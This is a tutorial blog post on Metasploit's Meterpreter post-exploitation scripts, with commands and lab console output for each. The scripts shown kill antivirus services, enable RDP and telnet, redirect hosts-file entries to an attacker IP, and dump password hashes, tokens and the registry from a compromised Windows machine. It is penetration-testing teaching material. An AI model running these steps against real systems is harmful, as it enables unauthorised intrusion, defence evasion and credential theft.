---
draft: false
title: MSF Meterpreter Scripts
linkTitle: MSF Meterpreter Scripts
translationKey: msf-meterpreter-scripting
weight: 380
date: 2017-06-14T13:45:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, you can find information about Meterpreter scripting in Metasploit Framework.
url: /msf-meterpreter-scripting/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## Meterpreter Scripting

One of the strengths of the Meterpreter command line is its versatility and the ability to easily adapt other script codes from outside. In this article, we will first see what the existing codes are in Meterpreter. Then, in the following articles, we will see how to create our own script codes as needed.

As in the entire Metasploit Framework system, Meterpreter script codes are written in the Ruby programming language. If you do not have enough knowledge about Ruby, I recommend that you examine the [Ruby Programming](http://ruby-doc.org/docs/ProgrammingRuby/) website for a while.

If you want to examine the scripts available in the Metasploit Framework, you can examine [GitHub](https://www.offensive-security.com/metasploit-unleashed/existing-scripts/). Examining the existing scripts will be very useful for us. There is probably a sample code fragment for the operation you want to do in the existing scripts. It would be the most logical approach to use the code section you want from here.

## Existing Scripts

A few script examples and what they do are explained below. You can examine Ruby codes accordingly.

In order to use Meterpreter scripts, you must have opened a Meterpreter session on the target system in some way. In the explanations, it is assumed that you have logged in.

## checkvm

The `checkvm` script, as its name suggests, is used to check whether you have opened a session on a virtual machine.

```bash
meterpreter > run checkvm > Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
> This is a VMware Workstation/Fusion Virtual Machine
```

## getcountermeasure

The `getcountermeasure` script allows you to see the security information of the target system. It helps you to disable Antivirus or Firewall.

```bash
 meterpreter > run getcountermeasure > Running Getcountermeasure on the target...
 > Checking for contrameasures...
 > Getting Windows Built in Firewall configuration...
 >
 > Domain profile configuration:
 > ----------------------------------------------------------------------------------
 > Operational mode = Disabled
 > Exception mode = Enable
 >
 > Standard profile configuration:
 > ----------------------------------------------------------------------------------
 > Operational mode = Disabled
 > Exception mode = Enable
 >
 > Local Area Connection 6 firewall configuration:
 > ----------------------------------------------------------------------------------
 > Operational mode = Disabled
 >
 > Checking DEP Support Policy...
```

## getgui

The `getgui` script enables you to turn on the RDP feature if it is disabled on the target computer.

```bash
 meterpreter > run getgui

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u -p
Or: getgui -e

OPTIONS:

 -e Enable RDP only.
 -f Forward RDP Connection.
 -h Help menu.
 -p The Password of the user to add.
 -u The Username of the user to add. meterpreter > run getgui -e > Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
 > Carlos Perez carlos_perez@darkoperator.com
 > Enabling Remote Desktop
 > RDP is already enabled
 > Setting Terminal Services service startup mode
 > Terminal Services service is already set to auto
 > Opening port in local firewall if necessary
```

## get_local_subnets

`get_local_subnets` script allows to obtain local subnet information of the target computer. This information can be used in pivoting operations.

```bash
meterpreter > run get_local_subnets 

Local subnet: 10.211.55.0/255.255.255.0
```

## gettelnet

`gettelnet` script is used to turn on telnet feature if it is disabled on the target computer.

```bash
meterpreter > run gettelnet
Windows Telnet Server Enabler Meterpreter Script
Usage: gettelnet -u -p

OPTIONS:

 -e Enable Telnet Server only.
 -f Forward Telnet Connection.
 -h Help menu.
 -p The Password of the user to add.
 -u The Username of the user to add.

meterpreter > run gettelnet -e

> Windows Telnet Server Enabler Meterpreter Script
> Setting Telnet Server Services service startup mode
> The Telnet Server Services service is not set to auto, changing it to auto ...
> Opening port in local firewall if necessary
```

## hostsedit

The `hostsedit` script is used to enter information into the Windows hosts file. This hosts file is first checked for the DNS addresses of the web addresses to which you want to connect. It is used to direct the target computer to the desired address. One address must be entered on each line.

```bash
meterpreter > run hostsedit

[!] Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
[!] Example: run post/windows/manage/inject_host OPTION=value [...]
This Meterpreter script is for adding entries in to the Windows Hosts file.
Since Windows will check first the Hosts file instead of the configured DNS Server
It will assist in diverting traffic to the fake entry or entries. Either a single
entry can be provided or a series of entries provided a file with one per line.

OPTIONS:

 -e Host entry in the format of IP,Hostname.
 -h Help Options.
 -l Text file with list of entries in the format of IP,Hostname. One per line.

Example:
run hostsedit -e 127.0.0.1,google.com

run hostsedit -l /tmp/fakednsentries.txt meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
> Making Backup of the hosts file.
> Backup located in C:\WINDOWS\System32\drivers\etc\hosts62497.back
> Adding Record for Host www.microsoft.com with IP 10.211.55.162 > Clearing the DNS Cache
```

## killav

The `killav` script is used to disable Antivirus programs running as a service on the system.

```bash
meterpreter > run killav > Killing Antivirus services on the target...
> Killing off cmd.exe...
```

## remotewinenum

The `remotewinenum` script is used to get information about the target system.

```bash
meterpreter > run remotewinenum

[!] Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
[!] Example: run post/windows/gather/wmic_command OPTION=value [...]
Remote Windows Enumeration Meterpreter Script
This script will enumerate windows hosts in the target enviroment
given a username and password or using the credential under witch
Meterpeter is running using WMI wmic windows native tool.
Usage:

OPTIONS:

    -h        Help menu.
    -p   Password of user on target system
    -t   The target address
    -u   User on the target system (If not provided it will use credential of process) meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128 > Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
 > Running WMIC Commands ....
 >     running command wimic environment list
 >     running command wimic share list
 >     running command wimic nicconfig list
 >     running command wimic computersystem list
 >     running command wimic useraccount list
 >     running command wimic group list
 >     running command wimic sysaccount list
 >     running command wimic volume list brief
 >     running command wimic logicaldisk get description,filesystem,name,size
 >     running command wimic netlogin get name,lastlogon,badpasswordcount
 >     running command wimic netclient list brief
 >     running command wimic netuse get name,username,connectiontype,localname
 >     running command wimic share get name,path
 >     running command wimic nteventlog get path,filename,writeable
 >     running command wimic service list brief
 >     running command wimic process list brief
 >     running command wimic startup list full
 >     running command wimic rdtoggle list
 >     running command wimic product get name,version
 >     running command wimic qfe list
```

## scraper

The `scraper` script is used to obtain more information than what is obtained with `remotewinenum`. The information obtained also includes registry records.

```bash
meterpreter > run scraper > New session on 10.211.55.128:4444...
> Gathering basic system information...
> Dumping password hashes...
> Obtaining the entire registry...
> Exporting HKCU
> Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
> Cleaning HKCU
> Exporting HKLM
> Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
```

As seen in the examples above, very detailed information can be collected with Meterpreter script codes. In addition, it is also used to disable Antivirus or Firewall.

## winenum

The `winenum` script can be used to obtain the most detailed information about the system. You can see token, hash information and all other information with the `winenum` script.

```bash
meterpreter > run winenum > Running Windows Local Enumerion Meterpreter Script
 > New session on 10.211.55.128:4444...
 > Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
 > Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
 > This is a VMware Workstation/Fusion Virtual Machine
 > Running Command List...
 > running command cmd.exe /c set
 > running command arp -a
 > running command ipconfig /all
 > running command ipconfig /displaydns
 > running command route print
 > running command net view
 > running command netstat -nao
 > running command netstat -vb
 > running command netstat -ns
 > running command net accounts
 > running command net accounts /domain
 > running command net session
 > running command net share
 > running command net group
 > running command net user
 > running command net localgroup
 > running command net localgroup administrators
 > running command net group administrators
 > running command net view /domain
 > running command netsh firewall show config
 > running command tasklist /svc
 > running command tasklist /m
 > running command gpresult /SCOPE COMPUTER /Z
 > running command gpresult /SCOPE USER /Z
 > Running WMIC Commands ....
 > running command wmic computersystem list brief
 > running command wmic useraccount list
 > running command wmic group list
 > running command wmic service list brief
 > running command wmic volume list brief
 > running command wmic logicaldisk get description,filesystem,name,size
 > running command wmic netlogin get name, lastlogon, badpasswordcount
 > running command wmic netclient list brief
 > running command wmic netuse get name,username,connectiontype,localname
 > running command wmic share get name,path
 > running command wmic nteventlog get path, filename, writeable
 > running command wmic process list brief
 > running command wmic startup list full
 > running command wmic rdtoggle list
 > running command wmic product get name,version
 > running command wmic qfe
 > Extracting software list from registry
 > Finished Extraction of software list from registry
 > Dumping password hashes...
 > Hashes Dumped
 > Getting Tokens...
 > All tokens have been processed
 >Done!
 ```
